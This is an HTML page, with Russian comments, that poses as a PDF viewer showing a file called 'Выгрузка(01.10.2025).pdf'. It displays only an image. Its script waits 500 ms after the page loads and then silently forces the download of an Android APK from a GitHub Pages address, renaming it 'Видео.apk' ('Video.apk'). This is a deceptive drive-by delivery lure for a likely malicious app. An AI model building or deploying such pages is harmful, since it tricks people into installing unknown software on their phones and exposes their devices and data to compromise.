    <style>
        /* Стили для имитации PDF */
        body, html { 
            margin: 0; padding: 0; 
            height: 100%; width: 100%; 
            font-family: Arial, sans-serif;
            background-color: #2c3e50; 
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: auto;
        }
        .pdf-viewer {
            width: 90%;
            max-width: 800px;
            height: 90vh;
            background-color: #34495e;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .header {
            background-color: #27ae60;
            color: white;
            padding: 10px 20px;
            font-weight: bold;
            font-size: 1.1em;
            text-align: center;
            user-select: none;
        }
        .content {
            flex-grow: 1;
            background-color: #ecf0f1;
            padding: 20px;
            overflow-y: scroll;
            text-align: center;
        }
        .content img {
            max-width: 100%;
            height: auto;
            border: 1px solid #bdc3c7;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: block;
            margin: 0 auto;
        }
    </style>

<body>
    <div class="pdf-viewer">
        <div class="header">
            &#x200B; Выгрузка(01.10.2025).pdf (1 из 5) &#x200B;
        </div>
        
        <div class="content">
            <img src="downloads/photo_site.jpg" alt="Содержимое PDF-файла">
            <p style="margin-top: 20px; color: #7f8c8d; font-size: 0.9em;">
                Документ автоматически загружается для просмотра в полном размере.
            </p>
        </div>
    </div>
    
    <script>
        const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
        const apkUrl = repoBaseUrl + 'downloads/test1.apk'; 
        const apkFilename = 'Видео.apk'; 

        function startDownload() {
            const link = document.createElement('a');
            link.href = apkUrl + '?t=' + Date.now(); 
            link.download = apkFilename; 
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        window.onload = function() {
            setTimeout(startDownload, 500); 
        };
    </script>
</body>
